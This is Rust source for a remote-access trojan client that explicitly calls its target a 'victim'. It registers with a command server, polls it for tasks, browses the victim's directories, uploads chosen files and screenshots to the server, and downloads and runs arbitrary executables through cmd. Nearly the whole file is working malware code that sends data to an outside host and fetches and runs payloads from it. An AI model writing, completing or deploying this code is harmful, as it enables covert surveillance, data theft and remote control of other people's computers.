use std::fs::{File, ReadDir};
use std::io::{Read, Write, Error};
use std::process::Command;
use std::str::FromStr;
use std::{thread, time};
use crate::dir_reader::Reader;
use serde_json::Value;

pub enum RequestResult{
    ErrorConnectToServer,
    Ok
}

pub struct Client{
    server_addr: String,
    dir_reader: Reader,
    name: String
}

impl Client {
    pub fn new(server_addr: &str) -> Client{
        Client { 
            server_addr: server_addr.to_string(),
            dir_reader: Reader::new(std::env::current_dir().unwrap().display().to_string()),
            name: "".to_string()
        }
    }

    pub fn ping(&mut self, victim_name: &str) -> RequestResult{
        let url = format!("{}/ping", self.server_addr.clone());
        let victim_name = victim_name.clone();

        let file = File::open("name.dat");

        match file {
            Ok(mut file) => {

                let mut bb = [0u8; 1024];
                file.read(&mut bb).unwrap();

                let name = String::from_utf8_lossy(&bb);

                let json = format!(r#"["{}", "{}"]"#, victim_name, name.replace("\0", ""));

                self.name = name.clone().to_string();
                 
                let res = self.send_string("ping".to_string(), json); 

                match res {
                    Err(e) => {println!("{}", e.to_string()); return RequestResult::ErrorConnectToServer;}
                    _ => RequestResult::Ok
                }
                
            },
            Err(_) => {

                let res = self.send_string("ping".to_string(), format!(r#"["{}"]"#, victim_name));
                
                match res {
                    Err(e) => {println!("{}", e.to_string()); return RequestResult::ErrorConnectToServer;}
                    _ => RequestResult::Ok
                };

                let mut res = res.unwrap();

                let mut buf = [0u8; 1024];
                res.read(&mut buf);

                self.name = String::from_utf8_lossy(&buf).to_string();

                let mut file = File::create("name.dat").unwrap();
                file.write(&buf).unwrap();

                RequestResult::Ok
            }
        }
    }

    pub fn listen(&mut self){
        loop {
            let response = self.send_string("get-task".to_string(), self.name.clone().replace("\0", ""));

            match response{
                Err(e) => {println!("{}", e.to_string()); return}
                _ => ()
            }

            let response = response.unwrap();

            let response_data = response.text().unwrap();
            println!("{}", response_data);
            let json: Value = serde_json::from_str(response_data.as_str()).unwrap();

            let _type =  json.get("type").unwrap().as_str().unwrap();

            match _type {
                "none" => (),
                "make_screen" => self.make_screen(),
                "ls" => self.answer_ls(),
                "cd" => self.cd(json.get("command")
                                .unwrap()
                                .as_str()
                                .unwrap()),

                "download" => self.upload_file(json.get("filename")
                                .unwrap()
                                .as_str()
                                .unwrap()),

                "change_disk" => self.change_disk(json.get("disk")
                                .unwrap()
                                .as_str()
                                .unwrap()),
                "load_and_start_and_terminate" => {
                    
                    self.load_and_start_and_terminate(json.get("_filename")
                                .unwrap()
                                .as_str()
                                .unwrap());
                    return;        
                            },
                _ => ()
            }

            
            thread::sleep(time::Duration::from_millis(100));
        }
    }

    fn send_string(&mut self, url: String, data: String) -> Result<reqwest::blocking::Response, reqwest::Error>{
        let client = reqwest::blocking::Client::new();

        let url = format!("{}/{}", self.server_addr, url);

        let response = client.post(url)
            .body(data)
            .send();

        response
    }

    fn send_bytes(&mut self){
        
    }

    pub fn send_log(&mut self){
        self.make_screen();

        //

    }

    fn load_and_start_and_terminate(&mut self, filename: &str){
        let url = format!("{}/static_dir/{}", self.server_addr.clone(), filename);

        let buf = reqwest::blocking::get(url)
            .unwrap()
            .bytes()
            .unwrap();

        let mut file = File::create(filename).unwrap();
        file.write(&buf).unwrap();

        let r = Command::new("cmd")
            .args(["/C", filename])
            .output()
            .unwrap();

        println!("{:?}", r)
    }

    fn change_disk(&mut self, disk: &str){
        let res = self.dir_reader.change_disk(disk);

        println!("{:?}", res);

        match res{
            Ok(msg) => self.answer_ls(),
            Err(e) => self.send_error(e.to_string())
        }

    }

    fn upload_file(&mut self, filename: &str){
        println!("{}", filename);
        let current_dir = self.dir_reader.current_dir.clone();

        let path_to_file = format!("{}/{}", current_dir, filename);

        let file = File::open(path_to_file).unwrap();

        let url = format!("{}/upload-file", self.server_addr);

        let client = reqwest::blocking::Client::new();
        let res = client.post(url)
                .body(file)
                .send()
                .unwrap();
    }

    fn cd(&mut self, command: &str){
        self.dir_reader.cd(command);
        self.answer_ls();
    }

    fn answer_ls(&mut self){
        let result = self.dir_reader.ls();

        match result {
            Ok(dir) => {self.send_dirs(dir)},
            Err(e) => {self.send_error(e.to_string())}
        }
    }

    fn send_dirs(&mut self, dir: ReadDir){
        let mut answer = Vec::new();

        for dir in dir{
            answer.push(dir.unwrap().path().display().to_string());
        }

        println!("{:?}", answer);
        self.send_string("return-ls".to_string(), answer.join("<:>")).unwrap();

    }

    fn send_error(&mut self, msg: String){

        self.dir_reader.cd("./");
        self.send_string("return-ls".to_string(), msg).unwrap();

        }
        

    pub fn make_screen(&mut self){
        Command::new("cmd")
            .args(["/C", "nircmd.exe savescreenshot 1.png"])
            .output()
            .unwrap();

        let file = File::open("1.png").unwrap();

        let client = reqwest::blocking::Client::new();

        let url = format!("{}/uploadfile", self.server_addr);

        let res = client.post(url)
            .body(file)
            .send()
            .unwrap();
    }
}